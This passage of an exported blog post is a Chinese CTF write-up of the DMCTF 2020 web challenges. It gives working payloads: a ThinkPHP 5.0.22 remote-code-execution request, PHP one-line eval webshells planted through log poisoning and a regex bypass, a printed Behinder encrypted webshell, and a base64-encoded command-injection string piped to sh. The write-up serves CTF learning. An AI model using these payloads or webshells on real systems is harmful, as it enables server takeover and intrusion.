后半部分根据Behinder的[官方文档](https://xz.aliyun.com/t/2774)和博客[渗透测试-流量加密之冰蝎&蚁剑](https://blog.csdn.net/weixin_39190897/article/details/109417674)的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行`$_GET['secret']`中的`secret`。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题**weak_type**中提到的不同字符串加密后md5相同绕过。最后payload：\n\n```\nCODE\nhttp://网址/bingxie.php?a=QNKCDZO&b=240610708\n```\n\n使用Behinder连接。可以在根目录下找到flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png)\n\n## filerce\n\n 先看提示：**看看log里面存的什么（利用伪协议包含）**，以下是访问后页面：\n\n```\nPHP\n<?php\nerror_reporting(0);\nshow_source(__FILE__);\n$sandbox = '/var/www/html/sandbox/'.md5(\"DMCTF\".$_SERVER['REMOTE_ADDR']);\nmkdir($sandbox,0777,true);\nchdir($sandbox);\nif (isset($_GET['file'])) {\n    if (strpos($_GET[\"file\"], \"base64-decode\")) {\n        include $_GET[\"file\"];\n    } else {\n        echo \"Hacker!!!\";\n    }\n}\nelse{\n    echo \"get me a file\";\n}\nfile_put_contents(\"thx.log\", base64_encode('http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI'])));\necho \"<br/>\";\necho \"You've been recorded in $sandbox/thx.log!!!!\"\n?> get me a file\nYou've been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!\n```\n\n使用文件包含查看thx.log有什么，请求访问：\n\n```\nCODE\nhttp://网址?file=php://filter/convert.base64-decode/resource=thx.log\n```\n\n 输出了thx.log文件内容：`http://dmctf.vaala.cloud:28236/favicon.ico`，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是`http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']`，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了`http://网址?file=php://filter/convert.base64-decode/resource=thx.log`。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：\n\n```\nCODE\nhttp://网址?file=php://filter/<?php @eval($_POST['a']);?>convert.base64-decode/resource=thx.log\n```\n\n 使用python脚本不断写入：\n\n```\nPYTHON\n#coding=utf-8\nimport requests\nimport sys\ndef CompeteUpload():  #上传页面\n    geturl=\"http://dmctf.vaala.cloud:28426/?file=php://filter/<?php @eval($_POST['a']);?>convert.base64-decode/resource=thx.log\"     #访问上传文件\n    r1=requests.get(url=geturl)\nif __name__==\"__main__\":\n    i=10;\n    while (i>0):\n        i-=1;\n        CompeteUpload();\n```\n\n 尝试访问`http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log`，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：\n\n```\nCODE\nhttp://网址?file=php://filter/convert.base64-decode/resource=thx.log\n```\n\n同样在根目录下找到flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png)\n\n## do_you_have_a_right_token\n\n F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：\n\n```\nPHP\n<?php \nsession_start();\ninclude 'flag.php';\ndate_default_timezone_set('Asia/Shanghai');\nif(isset($_POST['token']) && isset($_SESSION['token']) &&!empty($_POST['token'])&&!empty($_SESSION['token'])){\n    if($_POST['token']==$_SESSION['token']){\n        echo \"PassResetSuccess! Your Flag is:\".$flag;\n    }else{\n        echo \"Token_error!\";\n    }\n}else{\n    mt_srand(time());\n\n    $rand= mt_rand();\n    $_SESSION['token']=sha1(md5($rand));\n    echo \"Token Generate Ok!\";\n    \n}\necho '<form action=\"\" method=\"POST\">\n    <input type=\"text\" name=\"token\">\n    <input type=\"submit\" value=\"submit\">\n</form>';\necho \"<!--\\r\\n\".file_get_contents(__FILE__);\n?>\n```\n\n 分析一波：判断post请求中的`token`，如果不为空则与`$_SESSION['token']`判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入`$_SESSION[‘token’]`。\n\n 所以思路就是：**我们需要知道生成的那个随机数的值**，在网上搜到参考[php伪随机数](https://blog.csdn.net/zss192/article/details/104327432)，可以根据种子预测随机数。题目使用：\n\n```\nCODE\nmt_srand(time());\n```\n\n 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：\n\n```\nPHP\n<?php\ndate_default_timezone_set('Asia/Shanghai');\necho time();\n?>\n```\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png)\n\n计算时间差为69，所以修改代码跑一遍：\n\n```\nPHP\n<?php\ndate_default_timezone_set('Asia/Shanghai');\n// echo time()-69;  这是我验证时间用的\n    mt_srand(time()-69);\n    $rand = mt_rand();\n    echo sha1(md5($rand));\n?>\n```\n\n提交本地运行后得到的密文提交上去就可以获得flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png)\n\n## pingpingping\n\n 进入以后是一个类似终端的界面，随便输几个指令提示：**输入help获得提示**，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的`pingpingping`，可以使用通道符`|`连接执行其他命令，搜索到了疑似本题的博客[GXYCTF–PingPingPing](https://www.jianshu.com/p/fd7f9fcc9333)，猜测flag很有可能还在根目录下，所以可以执行`cat /flag`输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：\n\n```\nCODE\n127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh\n```\n\n获得flag\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png)\n\n## p3’webshell\n\n 提示给了一个链接：[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）\n\n源码：\n\n```\nCODE\n<?php\n$command=$_POST['command'];\nhighlight_file(__FILE__);\nif(!preg_match('/\\'|{|\\(|\\)|}|\\$|_|=|1|\\+|;|\\./i', $command)){\n    die(\"<script>alert('?')</script>\");\n}\neval($command);\n?>\n```\n\n第4行使用正则表达式匹配`$command`字符串，但是前面有一个`!`取反，所以只要payload匹配到正则表达式即可绕过。post中请求：\n\n```\nCODE\ncommand=fputs(fopen('shell.php','w'),'<?php @eval($_POST['a']);?>');\n```\n\n使用蚁剑连接`http://网址/shell.php`，在根目录里找到flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png)","source":"_posts/DMCTF之Web.md","raw":"---\ntitle: DMCTF之Web\ndate: 2020-11-29 23:17:50\ncategories:\n- CTF\ntags:\n- Web\n- DMCTF2020\n- RCE\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232346.png\n---\n\n# 前言\n\n比赛地址：[http://dmctf.vaala.cloud:81](http://dmctf.vaala.cloud:81/)\n\n这次先写Web题目部分，我最后的排名：\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png)\n\n# Web\n\n## weak_type\n\n源码：\n\n```\nPHP\n<?php\n\nshow_source(__FILE__);\ninclude('class.php');\n\n//level1 \n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"202020020\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===202020020){\n        echo \"<br> level 1 Ok <br>\";\n    }else{\n        die('what are you doing?');\n    }\n}else{\n    die();\n}\n\n//level 2\n\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if($v1 != $v2 && md5($v1)==md5($v2)){\n        echo \"<br> level 2 Ok <br>\";\n    }else{\n        die('Are you kidding me ?');\n    }\n}else{\n    die();\n}\n\n//level 3 \n\nif (isset($_POST['message'])) {\n    $message = json_decode($_POST['message']);\n    if ($message->key == $key) {\n        echo \"<br> Wow you got it !!! <br>\";\n        echo file_get_contents('/flag');\n    } \n    else {\n        die(\"fail\");\n    }\n }\nelse{\n     echo \"~~~~\";\n }\n```\n\n **第一关**利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造`num=202020020a`，即可。\n\n> intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞\n\n **第二关**利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：`v1=QNKCDZO&v2=240610708`，这篇博客中还进一步的讲解了一些[md5函数的漏洞](https://blog.csdn.net/qq_19980431/article/details/83018232)。\n\n **第三关**进行`$message->key`和`$key`进行判断，`$key`之前没有声明过故值为空，所以传入的`message`也为空即可。post中传入`message=` 即可。\n\n**完整payload**：\n\nurl: `http://dmctf.vaala.cloud:28113/?num=202020020a&v1=QNKCDZO&v2=240610708`\n\npost: `message=`\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png)\n\n## thinkphp\n\n 看到框架首先去搜索框架的漏洞，参考了[[框架漏洞\\]Thinkphp系列漏洞【截至2020-07-20】](https://blog.csdn.net/qq_37865996/article/details/107468816)\n\n 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对`$_POST[‘_method’]`属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。\n\n测试payload：\n\n**url**： `?s=captcha`\n\n**post**： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami`\n\n虽然报错但是最上方输出了`www-data`\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png)\n\n根据题目中的提示**flag在环境变量中**，所以在网上查询linux系统输出环境变量的语句：\n\n```\nSHELL\nenv\n```\n\n最终获取到flag的payload：\n\nurl： `?s=captcha`\n\npost： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=env`\n\n在输出末尾即是flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png)\n\n## fungame\n\n 打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。\n\n我先下了源码到本地康一康，查看源码在`game.js`中第122行中：\n\n```\nJAVASCRIPT\nnextLevel = (nextLevel+1)%11;\n```\n\n `nextlevel`根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：\n\n```\nJAVASCRIPT\nclass PlayerData\n{\n    // track player data between levels (when player is destroyed)\n    constructor()\n    {\n        this.health = 3;\n        this.healthMax = 3;\n        this.boomerangs = 1;\n        this.bigBoomerangs = 0;\n        this.coins = 0;\n    }\n}\n```\n\n 人物属性值中的`health`、`healthMax`、`bigBoomerangs`数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。\n\n 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg)\n\n## bingxie\n\n 首先根据提示：**你需要一些特殊软件**，再看题目联想到[Behinder](https://github.com/rebeyond/Behinder/releases)，首先下载工具。\n\n分析题目：\n\n源码：\n\n```\nPHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file) //hint in bingxie.php\n{\n    $file = strtolower($file);\n    $file = str_replace('php', \"\", $file);\n    $file = str_replace('data', \"???\", $file);\n    $file = str_replace('http', \"???\", $file);\n    $file = str_replace('file', \"???\", $file);\n    $file = str_replace('input', \"???\", $file);\n    $file = str_replace('filter', \"\", $file);\n    $file = str_replace('log',\"???\",$file);\n    return $file;\n}\n$file = $_GET['file'];\n$md5 =substr(md5($_GET['md5']),0,6);\n\n$file = filter($file);\nif ($md5=='e95100')\n{\n  include $file;\n}\n?>\n```\n\n 代码16、17行使用GET方法获得`file`和`md5`参数，`file`经过filter函数过滤一些PHP协议，`md5`参数进行md5加密并截取前6位，判断是否为`e95100`，如果判定成功include包含`file`变量指定的文件。\n\n 首先计算什么数进行md5加密后前六位是`e95100`。参考了[Getting MD5 with certain character pattern](https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern)中的回答，使用脚本：\n\n```\nPYTHON\nimport hashlib\n\ntarget = 'e95100'\ncandidate = 0\nwhile True:\n    plaintext = str(candidate)\n    hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()\n    if hash[:6] == target:\n        print('plaintext:\"' + plaintext + '\", md5:' + hash)\n        break\n    candidate = candidate + 1\n```\n\n 运行之后很快得出md5加密后前六位是`e95100`的数字是`6666`。\n\n 再根据提示`hint in bingxie.php`，直接访问`/bingxie.php`只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为`str_replace`函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：\n\n```\nCODE\nhttp://网址?md5=6666&file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp\n```\n\n 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的[github项目地址](https://github.com/gchq/CyberChef)）：\n\n```\nCODE\nPD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==\n```\n\n 解码后得到一个php文件：\n\n```\nPHP\n<?php\n@error_reporting(0);\nsession_start();\n//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中\n$a = $_GET['a'];\n$b = $_GET['b'];\nif($a!=$b&&md5($a)==md5($b))\n{\n    echo \"you are right\";\n}\nelse{\n    die(\"no ,you are not a real hacker !!!\");\n}\n\nif (isset($_GET['secret']))\n{\n    $key=substr(md5(uniqid(rand())),16);\n    $_SESSION['k']=$key;\n    print $key;\n}\n\nelse\n{\n    $key=$_SESSION['k'];\n\n    $post=file_get_contents(\"php://input\");\n\n    if(!extension_loaded('openssl'))\n    {\n        $t=\"base64_\".\"decode\";\n        $post=$t($post.\"\");\n        \n        for($i=0;$i<strlen($post);$i++) {\n                 $post[$i] = $post[$i]^$key[$i+1&15];\n                }\n    }\n\n    else\n    {\n        $post=openssl_decrypt($post, \"AES128\", $key);\n    }\n\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n    class C{public function __construct($p) {eval($p.\"\");}}\n\n    @new C($params);\n}\n?>\n```\n\n 后半部分根据Behinder的[官方文档](https://xz.aliyun.com/t/2774)和博客[渗透测试-流量加密之冰蝎&蚁剑](https://blog.csdn.net/weixin_39190897/article/details/109417674)的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行`$_GET['secret']`中的`secret`。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题**weak_type**中提到的不同字符串加密后md5相同绕过。最后payload：\n\n```\nCODE\nhttp://网址/bingxie.php?a=QNKCDZO&b=240610708\n```\n\n使用Behinder连接。可以在根目录下找到flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png)\n\n## filerce\n\n 先看提示：**看看log里面存的什么（利用伪协议包含）**，以下是访问后页面：\n\n```\nPHP\n<?php\nerror_reporting(0);\nshow_source(__FILE__);\n$sandbox = '/var/www/html/sandbox/'.md5(\"DMCTF\".$_SERVER['REMOTE_ADDR']);\nmkdir($sandbox,0777,true);\nchdir($sandbox);\nif (isset($_GET['file'])) {\n    if (strpos($_GET[\"file\"], \"base64-decode\")) {\n        include $_GET[\"file\"];\n    } else {\n        echo \"Hacker!!!\";\n    }\n}\nelse{\n    echo \"get me a file\";\n}\nfile_put_contents(\"thx.log\", base64_encode('http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI'])));\necho \"<br/>\";\necho \"You've been recorded in $sandbox/thx.log!!!!\"\n?> get me a file\nYou've been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!\n```\n\n使用文件包含查看thx.log有什么，请求访问：\n\n```\nCODE\nhttp://网址?file=php://filter/convert.base64-decode/resource=thx.log\n```\n\n 输出了thx.log文件内容：`http://dmctf.vaala.cloud:28236/favicon.ico`，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是`http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']`，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了`http://网址?file=php://filter/convert.base64-decode/resource=thx.log`。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：\n\n```\nCODE\nhttp://网址?file=php://filter/<?php @eval($_POST['a']);?>convert.base64-decode/resource=thx.log\n```\n\n 使用python脚本不断写入：\n\n```\nPYTHON\n#coding=utf-8\nimport requests\nimport sys\ndef CompeteUpload():  #上传页面\n    geturl=\"http://dmctf.vaala.cloud:28426/?file=php://filter/<?php @eval($_POST['a']);?>convert.base64-decode/resource=thx.log\"     #访问上传文件\n    r1=requests.get(url=geturl)\nif __name__==\"__main__\":\n    i=10;\n    while (i>0):\n        i-=1;\n        CompeteUpload();\n```\n\n 尝试访问`http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log`，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：\n\n```\nCODE\nhttp://网址?file=php://filter/convert.base64-decode/resource=thx.log\n```\n\n同样在根目录下找到flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png)\n\n## do_you_have_a_right_token\n\n F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：\n\n```\nPHP\n<?php \nsession_start();\ninclude 'flag.php';\ndate_default_timezone_set('Asia/Shanghai');\nif(isset($_POST['token']) && isset($_SESSION['token']) &&!empty($_POST['token'])&&!empty($_SESSION['token'])){\n    if($_POST['token']==$_SESSION['token']){\n        echo \"PassResetSuccess! Your Flag is:\".$flag;\n    }else{\n        echo \"Token_error!\";\n    }\n}else{\n    mt_srand(time());\n\n    $rand= mt_rand();\n    $_SESSION['token']=sha1(md5($rand));\n    echo \"Token Generate Ok!\";\n    \n}\necho '<form action=\"\" method=\"POST\">\n    <input type=\"text\" name=\"token\">\n    <input type=\"submit\" value=\"submit\">\n</form>';\necho \"<!--\\r\\n\".file_get_contents(__FILE__);\n?>\n```\n\n 分析一波：判断post请求中的`token`，如果不为空则与`$_SESSION['token']`判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入`$_SESSION[‘token’]`。\n\n 所以思路就是：**我们需要知道生成的那个随机数的值**，在网上搜到参考[php伪随机数](https://blog.csdn.net/zss192/article/details/104327432)，可以根据种子预测随机数。题目使用：\n\n```\nCODE\nmt_srand(time());\n```\n\n 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：\n\n```\nPHP\n<?php\ndate_default_timezone_set('Asia/Shanghai');\necho time();\n?>\n```\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png)\n\n计算时间差为69，所以修改代码跑一遍：\n\n```\nPHP\n<?php\ndate_default_timezone_set('Asia/Shanghai');\n// echo time()-69;  这是我验证时间用的\n    mt_srand(time()-69);\n    $rand = mt_rand();\n    echo sha1(md5($rand));\n?>\n```\n\n提交本地运行后得到的密文提交上去就可以获得flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png)\n\n## pingpingping\n\n 进入以后是一个类似终端的界面，随便输几个指令提示：**输入help获得提示**，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的`pingpingping`，可以使用通道符`|`连接执行其他命令，搜索到了疑似本题的博客[GXYCTF–PingPingPing](https://www.jianshu.com/p/fd7f9fcc9333)，猜测flag很有可能还在根目录下，所以可以执行`cat /flag`输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：\n\n```\nCODE\n127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh\n```\n\n获得flag\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png)\n\n## p3’webshell\n\n 提示给了一个链接：[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）\n\n源码：\n\n```\nCODE\n<?php\n$command=$_POST['command'];\nhighlight_file(__FILE__);\nif(!preg_match('/\\'|{|\\(|\\)|}|\\$|_|=|1|\\+|;|\\./i', $command)){\n    die(\"<script>alert('?')</script>\");\n}\neval($command);\n?>\n```\n\n第4行使用正则表达式匹配`$command`字符串，但是前面有一个`!`取反，所以只要payload匹配到正则表达式即可绕过。post中请求：\n\n```\nCODE\ncommand=fputs(fopen('shell.php','w'),'<?php @eval($_POST['a']);?>');\n```\n\n使用蚁剑连接`http://网址/shell.php`，在根目录里找到flag。\n\n![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png)","slug":"DMCTF之Web","published":1,"updated":"2021-12-30T09:42:54.176Z","_id":"ckrr3f9bz003thotcc5f204us","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>比赛地址：<a href=\"http://dmctf.vaala.cloud:81/\">http://dmctf.vaala.cloud:81</a></p>\n<p>这次先写Web题目部分，我最后的排名：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png\" alt=\"img\"></p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"weak-type\"><a href=\"#weak-type\" class=\"headerlink\" title=\"weak_type\"></a>weak_type</h2><p>源码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;class.php&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">//level1 </span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;202020020&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===202020020)&#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt; level 1 Ok &lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&#x27;what are you doing?&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//level 2</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if($v1 != $v2 &amp;&amp; md5($v1)==md5($v2))&#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt; level 2 Ok &lt;br&gt;&quot;;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&#x27;Are you kidding me ?&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//level 3 </span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&#x27;message&#x27;])) &#123;</span><br><span class=\"line\">    $message = json_decode($_POST[&#x27;message&#x27;]);</span><br><span class=\"line\">    if ($message-&gt;key == $key) &#123;</span><br><span class=\"line\">        echo &quot;&lt;br&gt; Wow you got it !!! &lt;br&gt;&quot;;</span><br><span class=\"line\">        echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        die(&quot;fail&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">     echo &quot;~~~~&quot;;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>第一关</strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造<code>num=202020020a</code>，即可。</p>\n<blockquote>\n<p>intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞</p>\n</blockquote>\n<p> 